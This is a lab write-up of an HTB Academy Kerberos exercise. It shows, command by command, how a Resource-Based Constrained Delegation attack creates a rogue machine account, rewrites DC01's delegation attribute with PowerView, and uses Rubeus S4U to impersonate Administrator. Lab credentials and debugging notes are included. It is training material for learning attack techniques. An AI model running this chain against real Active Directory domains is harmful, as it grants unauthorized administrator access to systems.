# RBCD Overview & Attacking from Windows

**Module:** HTB Academy — Kerberos Attacks
**Entry point:** `ACADEMY-KERBATTCK-WS01` (RDP), domain `INLANEFREIGHT.LOCAL`
**Given access:** `htb-student` / `HTB_@cademy_stdnt!`
**Secondary creds (found rights, not initial access):** `carole.holmes` / `Y3t4n0th3rP4ssw0rd`
**Goal:** find which machine `carole.holmes` has rights over, then read `C:\carole.holmes\flag.txt` on DC01

**Result:** `Carole_Fl4G_RBCD` — Administrator-equivalent (CIFS) access on DC01 via Resource-Based Constrained Delegation, entirely from a Windows GUI session using Rubeus + PowerView + Powermad.

---

## 1. Attack chain (summary)

1. RDP to WS01 as `htb-student`.
2. Enumerate with PowerView: find every AD computer object where `carole.holmes` holds any ACE, filtering by her SID → `DC01$` has `WriteProperty` for her.
3. That `WriteProperty` is exactly what's needed to set `msDS-AllowedToActOnBehalfOfOtherIdentity` on `DC01$` — i.e., configure **Resource-Based Constrained Delegation** (RBCD) pointing at an attacker-controlled computer account.
4. Create a new computer account (`EVILPC$`) with Powermad, authenticating as `carole.holmes` (uses the default `ms-DS-MachineAccountQuota`, no special rights needed beyond being a normal domain user).
5. Build the RBCD security descriptor (`msDS-AllowedToActOnBehalfOfOtherIdentity`) granting `EVILPC$` the right to delegate to `DC01$`, write it with PowerView's `Set-DomainObject`, again as `carole.holmes`.
6. `Rubeus.exe hash` to get `EVILPC$`'s own RC4/NTLM hash from the password we set for it.
7. `Rubeus.exe s4u` — S4U2Self (impersonate Administrator as `EVILPC$`) + S4U2Proxy (service ticket to `cifs/DC01.INLANEFREIGHT.LOCAL`) — `/ptt` to inject.
8. `dir`/`type` over the UNC path to `DC01`'s `C$` share using the forged Administrator ticket → read the flag.

---

## 2. Where I got stuck (and the actual fixes)

### 2.1 Target IP/creds gave `STATUS_NO_LOGON_SERVERS` — twice, on two different spawns

```
nxc smb 10.129.70.115 -u htb-student -p 'HTB_@cademy_stdnt!'
SMB ... [-] INLANEFREIGHT.LOCAL\htb-student:... STATUS_NO_LOGON_SERVERS
```
Confirmed this wasn't a credential, domain-name, or client-syntax issue: `--local-auth` against the same box gave a *different*, expected error (`STATUS_LOGON_FAILURE`, since it's not a local account), proving the box itself was reachable and SMB worked — it specifically couldn't validate *domain* credentials, i.e. it couldn't reach its own DC at that moment. This happened on a first IP and again immediately after respawning to a second IP. Waited ~20s and retried the exact same command with no other changes — it then succeeded, including showing `(Pwn3d!)`. Lesson: on a freshly spawned/respawned lab instance, give the domain controller a little time to finish booting before concluding credentials or networking are broken; `STATUS_NO_LOGON_SERVERS` specifically (not `LOGON_FAILURE`, not a connection error) is the tell that it's a DC-reachability problem on the target's side, not yours.

### 2.2 `New-Object byte[] 0` then `GetBinaryForm($SDBytes, 0)`

First RBCD-write attempt:
```
Exception calling "GetBinaryForm" with "2" argument(s): "Destination array is not long enough to copy all the required data. Check array length and offset."
```
`New-Object byte[] 0` allocates a **zero-length** array — I'd meant to size it to the security descriptor's actual length but typed the literal `0` instead of calling `.BinaryLength`. Fix:
```powershell
$SDBytes = New-Object byte[] ($RawSD.BinaryLength)
$RawSD.GetBinaryForm($SDBytes, 0)
```
The resulting `Set-DomainObject` run then also showed a secondary symptom of the same root cause further downstream (`WARNING: ... Setting 'msds-allowedtoactonbehalfofotheridentity' to '' ... Arithmetic result exceeded 32 bits`) — PowerView tried to write an effectively-empty/garbage byte blob to an attribute that expects a specific binary SD format, and the LDAP provider choked on it. Once the byte array was sized correctly, the same `Set-DomainObject` call succeeded cleanly (confirmed by reading the attribute back afterward — non-zero length, 80 bytes).

### 2.3 Confirming the write actually worked

Rather than trust the absence of a second error, explicitly read the attribute back after writing it:
```powershell
(Get-DomainComputer DC01 -Credential $Cred -Properties msds-allowedtoactonbehalfofotheridentity).'msds-allowedtoactonbehalfofotheridentity'.Length
# 80
```
A non-zero length confirmed the SD was actually persisted before moving on to the Rubeus step — cheap sanity check that avoids chasing a downstream Kerberos failure caused by an RBCD attribute that silently didn't get set.

### 2.4 Clipboard + Notepad round-trip for every script, again

Same technique as the two previous Windows-GUI modules in this series: write the PowerShell on the Linux side, `xclip -selection clipboard`, paste into a freshly-opened Notepad inside the RDP session, save as `.ps1`, run with `powershell -ep bypass -File ...`. Avoids hand-typing multi-line scripts (and the credential string) through `xdotool`, and makes it trivial to fix a bug (see §2.2) and re-paste a corrected version rather than re-typing from scratch.

### 2.5 UAC token filtering (same as prior modules) — `htb-student` needed elevation first

`whoami /groups` showed `BUILTIN\Administrators ... Group used for deny only` even though `htb-student` is a local admin on WS01. `Start-Process powershell -Verb RunAs` → UAC consent (no password, just a click) → elevated shell, used for everything from here on. This isn't actually required for the RBCD *attack itself* (`carole.holmes`'s domain rights are what matter, not local admin on WS01) but was needed to read `C:\Tools\*.ps1` and run `Rubeus.exe` without friction in this particular lab image.

---

## 3. Full command sequence (as actually run, inside the RDP session)

```powershell
# 1. Find which computer carole.holmes has rights over
Import-Module C:\Tools\PowerView.ps1
$sid = (Get-DomainUser carole.holmes).objectsid
Get-DomainComputer | ForEach-Object {
    $comp = $_
    Get-DomainObjectAcl -Identity $comp.samaccountname -ResolveGUIDs | Where-Object {
        $_.SecurityIdentifier -eq $sid
    } | Select-Object @{N='Computer';E={$comp.samaccountname}}, ActiveDirectoryRights, SecurityIdentifier
}
# Computer  ActiveDirectoryRights  SecurityIdentifier
# DC01$     WriteProperty          S-1-5-21-...-1106   (carole.holmes)

# 2. Credentials object for carole.holmes (the rights-holder, not the RDP account)
$SecPassword = ConvertTo-SecureString 'Y3t4n0th3rP4ssw0rd' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\carole.holmes', $SecPassword)

# 3. Create attacker-controlled computer account
Import-Module C:\Tools\Powermad.ps1
New-MachineAccount -MachineAccount EVILPC -Password $SecPassword -Credential $Cred -Verbose

# 4. Build + write the RBCD security descriptor on DC01$
$ComputerSid = (Get-DomainComputer EVILPC -Credential $Cred -Properties objectsid).objectsid
$RawSD = New-Object Security.AccessControl.RawSecurityDescriptor `
    -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($RawSD.BinaryLength)
$RawSD.GetBinaryForm($SDBytes, 0)
Set-DomainObject -Credential $Cred -Identity DC01$ `
    -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

# 5. Get EVILPC$'s own RC4 hash
C:\Tools\Rubeus.exe hash /password:Y3t4n0th3rP4ssw0rd /user:EVILPC$ /domain:INLANEFREIGHT.LOCAL
# rc4_hmac : 37EF72FCF42A4021948C7ED7B33CCF21

# 6. S4U2Self + S4U2Proxy impersonating Administrator, inject
C:\Tools\Rubeus.exe s4u /user:EVILPC$ /rc4:37EF72FCF42A4021948C7ED7B33CCF21 `
    /impersonateuser:Administrator /msdsspn:cifs/DC01.INLANEFREIGHT.LOCAL /ptt
# [+] Ticket successfully imported!

# 7. Read the flag
dir  \\DC01.INLANEFREIGHT.LOCAL\C$\carole.holmes
type \\DC01.INLANEFREIGHT.LOCAL\C$\carole.holmes\flag.txt
# Carole_Fl4G_RBCD
```

---

## 4. Flag

**`Carole_Fl4G_RBCD`**

---

## 5. Key takeaways

- **RBCD only needs `WriteProperty`/`GenericWrite`-type rights on the *target* computer object** — nothing on the attacker-controlled side beyond the default `ms-DS-MachineAccountQuota` (10 by default) that lets any domain user add a computer account. Owning one weak ACE on a machine's AD object is enough to end up impersonating Administrator *on that machine*.
- Enumerate who-has-rights-over-what computers broadly (`Get-DomainComputer | ForEach { Get-DomainObjectAcl ... }`), not just the one host you already suspect — the vulnerable edge can be on any computer object, not necessarily the one tied to your current session.
- Hand-building a `RawSecurityDescriptor`'s byte form is a common RBCD step and an easy place to get a subtly-wrong, silently-corrupt byte array (§2.2) — always size the buffer from `.BinaryLength`, and always read the target attribute back after writing it to confirm non-zero length before moving on to the Kerberos abuse step.
- `STATUS_NO_LOGON_SERVERS` (as opposed to `STATUS_LOGON_FAILURE`) on a freshly (re)spawned HTB target is very often just "the DC hasn't finished booting yet" — worth one retry after a short wait before concluding the environment itself is broken.
